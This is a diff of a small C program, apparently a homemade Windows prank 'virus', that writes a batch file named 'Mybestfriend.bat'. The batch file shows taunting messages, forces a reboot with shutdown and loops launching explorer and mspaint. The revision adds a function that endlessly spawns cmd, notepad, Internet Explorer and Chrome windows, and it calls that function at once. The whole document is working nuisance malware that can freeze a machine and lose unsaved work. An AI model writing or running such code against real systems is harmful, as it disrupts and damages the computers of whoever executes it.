@@ -1,29 +1,47 @@
 #include <stdio.h>
+#include <stdlib.h> // Warning Prevention
+#include <conio.h> // Warning Prevention
 
 /**
 @author Eduardo José
 @since 27/10/19
-@version 1.0.0
+@version 2.0.0
 */
 
-int main(){
+void bat(){
+
+
+    for(;;){
+
+
+        printf("%d");
+        system("start cmd");
+        system("start notepad");
+        system("start iexplore");
+        system("start chrome ");
+
+    }
+}
+
+void main(){
+
+
 
 
     FILE *arq = fopen("Mybestfriend.bat","w"); // Inicializando ponteiro -> abrindo e criando o arquivo
 
-    if(arq){ // Verifica se o arquivo existe no sistema e retorna a escrita
+    if(arq){   // Verifica se o arquivo existe no sistema e retorna a escrita
 
-        fprintf(arq,"@echo off\nmsg * Ola\nmsg * Voce quer ser meu amigo?\nmsg * Destruindo o sistema...\nshutdown -r -t 10\n:loop\nstart explorer\nstart mspaint\ngoto loop"); // Copia as mensagens para dentro do arquivo
-        printf("\nVirus criado com sucesso!\n");
-        printf("\n\nAgora com o arquivo criado va ate o local onde voce iniciou esse programa e execute o programa 'Mybestfriend'\n\n");
 
+        // Copia as mensagens para dentro do arquivo
+        fprintf(arq,"@echo off\nmsg * Ola\nmsg * Voce quer ser meu amigo?\nmsg * Destruindo o sistema...\nshutdown -r -t 10\n:loop\nstart explorer\nstart mspaint\ngoto loop");
     }
-    else{ // Verifica se o arquivo não existe no sistema
+    fclose(arq);
 
-        printf("Arquivo nao foi criado!");
-    }
-    fclose(arq); // Fecha o arquivo após a manipulação por medidas de segurança
+    printf("\b\n MybestFriend...");
+    bat();
+    getch();
 
-    return 0;
+
 }
 
